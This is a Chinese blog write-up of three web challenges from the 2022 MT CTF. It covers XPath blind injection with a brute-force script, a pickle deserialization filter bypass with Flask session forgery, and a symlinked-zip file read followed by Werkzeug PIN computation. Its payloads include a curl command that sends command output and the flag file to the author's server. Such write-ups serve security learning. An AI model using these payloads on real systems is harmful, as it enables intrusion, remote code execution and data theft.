---
title: "2022 MT CTF Web 部分 Writeup"
date: 2022-09-18T8:22:22+08:00
lastmod: 2022-09-18T8:22:22+08:00
draft: false
author: "X1r0z"

tags: ['python','ctf']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

超常发挥了属于是

Web 只有 easyjava 没做出来

<!--more-->

## babyjava

提示是 xpath 注入, 不过之前没怎么接触过...

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209171825059.png)

输入 user1

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209171826163.png)

随着输入内容的改变又会出现两种回显 `This information is not available` 和 `No leakage of important information!!!`

参考文章

[https://xz.aliyun.com/t/7791](https://xz.aliyun.com/t/7791)

[https://www.yulate.com/144.html](https://www.yulate.com/144.html)

[https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/](https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/)

尝试了万能密码之类的无果, 只能查到 user1 这一条数据

但是确实存在注入

```
user1' and '1'='1  // user1
user1' and '1'='2 // This information is not available
```

于是尝试盲注, 但是 payload 跟 Tr0y 师傅里用的不太一样

如果后面用 or 拼接的话, 页面一直会返回 true (user1), 这里我改成了 and

根节点个数

```
' or count(/)=1 and '1'='1
```

根节点长度

```
' or string-length(name(/*[1]))=4 and '1'='1
```

根节点名称

```
' or substring(name(/*[1]), 1, 1)='r' and '1'='1
```

这样一层一层往下猜, 再往下的格式类似 `count(/root)`和 `name(/root/*[1])`

最后猜出来的路径是 /root/user/username

之后再往下猜的时候发现 `count(/root/user/username)` 的结果为 2

```
' or count(/root/user/username)=2 and '1'='1
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209171836946.png)

猜长度的时候发现不太对劲, 子节点的 length 为 0

```
' or string-length(name(/root/user/username/*[1]))=0 and '1'='1
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209171837476.png)

忽然意识到下面的可能就是数据了, 于是换成 substring

获取节点内容用 text()

```
' or string-length(/root/user/username[1]/text())=5 and '1'='1
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209171840635.png)

5 个字符刚好对应 user1

然后刚刚 count 的时候结果为 2, 猜测可能是有两条数据

最终脚本如下

```python
import requests

url = 'http://eci-2zeaab5gnvv8swr765bs.cloudeci1.ichunqiu.com:8888/hello'

dicts = r'{abcdefghijklmnopqrstuvwxyz-0123456789}'

results = ''

for n in range(1,100):
    for i in dicts:
        xpath = "' or substring(/root/user/username[2]/text()," + str(n) + ", 1)='" + i + "' and '1'='1"
        res = requests.post(url,data={
            'xpath': xpath
            })
        if 'available' not in res.text:
            results += i
            print(results)
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209171843161.png)

后面的就不跑了

## easypickle

```python
import base64
import pickle
from flask import Flask, session
import os
import random

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(2).hex()

@app.route('/')
def hello_world():
    if not session.get('user'):
        session['user'] = ''.join(random.choices("admin", k=5))
    return 'Hello {}!'.format(session['user'])


@app.route('/admin')
def admin():
    if session.get('user') != "admin":
        return f"<script>alert('Access Denied');window.location.href='/'</script>"
    else:
        try:
            a = base64.b64decode(session.get('ser_data')).replace(b"builtin", b"BuIltIn").replace(b"os", b"Os").replace(b"bytes", b"Bytes")
            if b'R' in a or b'i' in a or b'o' in a or b'b' in a:
                raise pickle.UnpicklingError("R i o b is forbidden")
            pickle.loads(base64.b64decode(session.get('ser_data')))
            return "ok"
        except:
            return "error!"


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888)
```

secret_key 是由 `os.urandom(2).hex()` 生成的, 运行一下就会发现返回的内容就是两个十六进制拼接起来, 类似 `a1c3` 这种, 其实能够爆破出来

`''.join(random.choices("admin", k=5))` 这句是把 a d m i n 五个字母随机重组得到最终的用户名, 这个其实也能够用 burp intruder 碰运气试出来 `admin` 的结果, 但是没有什么用, session 中 ser_data 的构造还是需要 secret_key

结合之前用过的 `flask_session_cookie_manager` 尝试爆破 secret_key 结果一直失败... 从网上找了个现成的工具用反而成功了

[https://github.com/Paradoxis/Flask-Unsign](https://github.com/Paradoxis/Flask-Unsign)

先生成字典

```python
with open('dict.txt','w+') as f:
    dicts = '0123456789abcdef'
    for a in dicts:
        for b in dicts:
            for c in dicts:
                for d in dicts:
                    f.write(a + b + c + d)
                    f.write('\n')
```

然后用工具爆破, 本地很快就出来了

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209171913952.png)

`ce06`

之后构造的 cookie structure 大概如下

```
{"user": "admin", "ser_data": "xxx"}
```

接下来的问题就是如何构造 ser_data

源码中 pickle 反序列化的部分有一些过滤


```python
a = base64.b64decode(session.get('ser_data')).replace(b"builtin", b"BuIltIn").replace(b"os", b"Os").replace(b"bytes", b"Bytes")
if b'R' in a or b'i' in a or b'o' in a or b'b' in a:
    raise pickle.UnpicklingError("R i o b is forbidden")
pickle.loads(base64.b64decode(session.get('ser_data')))
```

过滤了 R i o b 的 opcode, 几乎无法命令执行 (也可能是我了解的不是很深还没找出来绕过的方法...)

但是需要注意的是判断之前进行了好几次 replace, 但后面反序列化的内容还是被替换之前的 ser_data

而且这里 in 的判断是区分大小写的

然后再关注一下 replace, builtin 被替换成 BuIltIn, os 被替换成 Os, bytes 被替换成 Bytes, 恰巧地绕开了后面对 i o b 这三个字符的检测

所以我们的思路就是构造包含 i o b 这三个指令码的字符串 (builtin os bytes), 然后替换的时候绕过检测, 最终利用被替换前的 payload 进行反序列化

参考文章

[https://goodapple.top/archives/1069](https://goodapple.top/archives/1069)

翻到了这一段 opcode

```python
(cos
system
S'whoami'
o.
```

直接执行 whoami 不行, 因为有字符 i, 末尾的 o 也会被过滤

然后尝试把 `o.` 改成 `os`, 这样 `os` 在检测的时候会被提前替换成 `Os` 从而绕过过滤

```python
(cos
system
S'curl'
os
```

测试脚本

```python
import pickle

opcode = b'''(cos
system
S'curl'
os'''

a = opcode.replace(b"builtin", b"BuIltIn").replace(b"os", b"Os").replace(b"bytes", b"Bytes")
if b'R' in a or b'i' in a or b'o' in a or b'b' in a:
    raise pickle.UnpicklingError("R i o b is forbidden")
pickle.loads(opcode)
```

虽然报错了, 但是命令能够执行成功

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209171904030.png)

之后就简单了, 测试后发现服务器能够出网, 想着用 dnslog 外带数据

burp 和 ceye.io 以及 dnslog.cn 的网站域名或多或少都会有 i o b 这三个字符, 于是就用了自己的 vps

魔改了一下 `flask_session_cookie_manager` 方便构造 cookie

```python
#!/usr/bin/env python3
""" Flask Session Cookie Decoder/Encoder """
__author__ = 'Wilson Sumanang, Alexandre ZANNI'

# standard imports
import sys
import zlib
from itsdangerous import base64_decode
import ast
import base64
import pickle

# Abstract Base Classes (PEP 3119)
if sys.version_info[0] < 3: # < 3.0
    raise Exception('Must be using at least Python 3')
elif sys.version_info[0] == 3 and sys.version_info[1] < 4: # >= 3.0 && < 3.4
    from abc import ABCMeta, abstractmethod
else: # > 3.4
    from abc import ABC, abstractmethod

# Lib for argument parsing
import argparse

# external Imports
from flask.sessions import SecureCookieSessionInterface

class MockApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key


if sys.version_info[0] == 3 and sys.version_info[1] < 4: # >= 3.0 && < 3.4
    class FSCM(metaclass=ABCMeta):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e


        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if(secret_key==None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e
else: # > 3.4
    class FSCM(ABC):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e


        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if(secret_key==None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e



if __name__ == "__main__":
    opcode = base64.b64encode(b'''(cos
system
S'curl x.x.x.x:yyyy/ -X POST -d "`ls`"'
os
''')
    structs = '{"user":"admin", "ser_data":"' + str(opcode).replace('b\'','').replace('\'','') + '"}'
    a = base64.b64decode(str(opcode).replace('b\'','').replace('\'','')).replace(b"builtin", b"BuIltIn").replace(b"os", b"Os").replace(b"bytes", b"Bytes")
    if b'R' in a or b'i' in a or b'o' in a or b'b' in a:
        raise pickle.UnpicklingError("R i o b is forbidden")
    else:
        print(FSCM.encode('ce06', structs))
```

这里用的是 post, 因为 get 会有字符格式和长度的限制, 而且不能用 base64 之类的编码 (base64 含有 b 字符)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209171921445.png)

flag 位置在 /app/flag

```bash
curl x.x.x.x:yyyy/ -X POST -d "`cat /app/flag`
```

## OnlineUnzip

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209171933285.png)

```python
import os
import re
from hashlib import md5
from flask import Flask, redirect, request, render_template, url_for, make_response

app=Flask(__name__)

def extractFile(filepath):
    extractdir=filepath.split('.')[0]
    if not os.path.exists(extractdir):
        os.makedirs(extractdir)
    os.system(f'unzip -o {filepath} -d {extractdir}')
    return redirect(url_for('display',extractdir=extractdir))

@app.route('/', methods=['GET'])
def index():
    return render_template('index.html')

@app.route('/display', methods=['GET'])
@app.route('/display/', methods=['GET'])
@app.route('/display/<path:extractdir>', methods=['GET'])
def display(extractdir=''):
    if re.search(r"\.\.", extractdir, re.M | re.I) != None:
        return "Hacker?"
    else:
        if not os.path.exists(extractdir):
            return make_response("error", 404)
        else:
            if not os.path.isdir(extractdir):
                f = open(extractdir, 'rb')
                response = make_response(f.read())
                response.headers['Content-Type'] = 'application/octet-stream'
                return response
            else:
                fn = os.listdir(extractdir)
                fn = [".."] + fn
                f = open("templates/template.html")
                x = f.read()
                f.close()
                ret = "<h1>文件列表:</h1><br><hr>"
                for i in fn:
                    tpath = os.path.join('/display', extractdir, i)
                    ret += "<a href='" + tpath + "'>" + i + "</a><br>"
                x = x.replace("HTMLTEXT", ret)
                return x


@app.route('/upload', methods=['GET', 'POST'])
def upload():
    ip = request.remote_addr
    uploadpath = 'uploads/' + md5(ip.encode()).hexdigest()[0:4]

    if not os.path.exists(uploadpath):
        os.makedirs(uploadpath)

    if request.method == 'GET':
        return redirect('/')

    if request.method == 'POST':
        try:
            upFile = request.files['file']
            print(upFile.filename)
            if os.path.splitext(upFile.filename)[-1]=='.zip':
                filepath=f"{uploadpath}/{md5(upFile.filename.encode()).hexdigest()[0:4]}.zip"
                upFile.save(filepath)
                zipDatas = extractFile(filepath)
                return zipDatas
            else:
                return f"{upFile.filename} is not a zip file !"
        except:
            return make_response("error", 404)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000, debug=True)
```

在线 zip 解压, 解压时直接调用 unzip 系统命令

app.run 中有一个 `debug=True` 的参数, 猜测可能是利用 flask pin 或者覆盖模板文件进行 ssti, 因为 debug 模式下模板文件更新后会自动重新加载

想到了之前网鼎杯的时候利用 unrar 的 cve, 搜了一下发现 unzip 目前还没有类似的 cve

因为系统是 linux 的, 想试试软链接行不行, 但之前也没遇到过类似的利用方式, 只能碰碰运气了

参考文章

[https://www.yulate.com/141.html](https://www.yulate.com/141.html)

[https://forum.butian.net/share/906](https://forum.butian.net/share/906)

构造 passwd 的软链接

```bash
ln -s /etc/passwd passwd
zip -y passwd.zip passwd
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209171931024.png)

确实能够读取其它文件, 不过 /flag /flag.txt 之类的文件都读不出来

然后又试了下软链接目录

```bash
ln -s / test
zip --symlinks test.zip ./*
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209171933751.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209171933555.png)

任意文件读取, 并且可以遍历目录

访问 flag 文件显示没有权限

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209171934746.png)

 但这样子的话, flask 的报错页面也显示出来了 (之前还没尝试软链接目录的时候, 一直在想怎么让他报错...)

剩下的就是读取构造 pin 所需的各种文件

```
/etc/passwd
/sys/class/net/eth0/address
/etc/machine-id
```

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'ctf'# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '95529703075',# str(uuid.getnode()),  /sys/class/net/ens33/address
    '96cec10d3d9307792745ec3b85c89620'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

用 pin 登录的时候发现登录失败, 然后想到 flask 2020 年有一次更新导致生成 pin 的方式发生了变化

看看题目服务器里的对应源码

```
http://eci-2ze7a80yj44cia7kndlu.cloudeci1.ichunqiu.com:8888/display/uploads/4b3c/8cab/test/usr/local/lib/python3.8/site-packages/werkzeug/__init__.py
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209171939535.png)

先读取 `/etc/machine-id`, 再读取 `/proc/self/cgroup`, 最后把两个字符串进行拼接

cgroup 下载之后用源码里的代码跑一下

```python
linux = b""
with open("cgroup", "rb") as f:
    linux += f.readline().strip().rpartition(b"/")[2]
print(linux)
```

输出

```
96cec10d3d9307792745ec3b85c8962054c838c708041d6ae60ad7fbc13b336e438b8f820bbdb971f8fa7cd6b96644fe
```

改了之后还是不行, 又在网上搜了搜发现 flask 新版本生成 pin 的时候, 原来的 md5 加密改成了 sha1

参考文章

[https://blog.csdn.net/qq_42303523/article/details/124232532](https://blog.csdn.net/qq_42303523/article/details/124232532)

最终脚本如下

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'ctf'# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '95529703075',# str(uuid.getnode()),  /sys/class/net/ens33/address
    '96cec10d3d9307792745ec3b85c8962054c838c708041d6ae60ad7fbc13b336e438b8f820bbdb971f8fa7cd6b96644fe'# get_machine_id(), /etc/machine-id
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

# If we need to generate a pin we salt it a bit more so that we don't
# end up with the same value and generate out 9 digits
num = None
if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

# Format the pincode in groups of digits for easier remembering if
# we don't have a result yet.
rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv)
```

输入 pin 后 popen 执行命令得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209171947327.png)